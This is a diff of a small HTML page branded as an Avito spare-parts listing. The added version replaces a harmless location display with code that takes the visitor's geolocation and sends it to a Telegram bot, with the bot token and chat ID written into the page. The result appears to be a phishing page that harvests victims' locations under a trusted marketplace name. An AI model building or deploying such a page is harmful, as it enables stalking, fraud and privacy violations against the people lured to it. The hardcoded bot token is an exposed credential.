@@ -1,29 +1,44 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Авито Запчасть</title>
-</head>
-<body>
-  <h2>Подтвердите своё местоположение</h2>
-  <button onclick="getLocation()">Показать моё местоположение</button>
-  <p id="status"></p>
+  <head>
+    <title>Авито запчасть</title>
+    <meta charset="UTF-8" />
+  </head>
+  <body>
+    <h1>Показать моё местоположение</h1>
+    <button onclick="getLocation()">📍 Показать</button>
 
-  <script>
-    function getLocation() {
-      const status = document.getElementById('status');
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          status.innerText = `Ваши координаты: ${lat}, ${lon}`;
-        }, function(err) {
-          status.innerText = 'Ошибка получения координат.';
-        });
-      } else {
-        status.innerText = 'Ваш браузер не поддерживает геолокацию.';
+    <script>
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(sendToTelegram);
+        } else {
+          alert("Геолокация не поддерживается.");
+        }
       }
-    }
-  </script>
-</body>
+
+      function sendToTelegram(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        const message = `🛰 Координаты:\nШирота: ${lat}\nДолгота: ${lon}`;
+        const botToken = "7091173298:AAEwXyHlZkscayetEQf_2Btp-Odu2Xd09vk";
+        const chatId = "7307380020"; // твой Telegram ID
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+          .then(response => {
+            if (response.ok) {
+              alert("Координаты отправлены!");
+            } else {
+              alert("Ошибка при отправке.");
+            }
+          })
+          .catch(error => {
+            alert("Ошибка соединения.");
+          });
+      }
+    </script>
+  </body>
 </html>
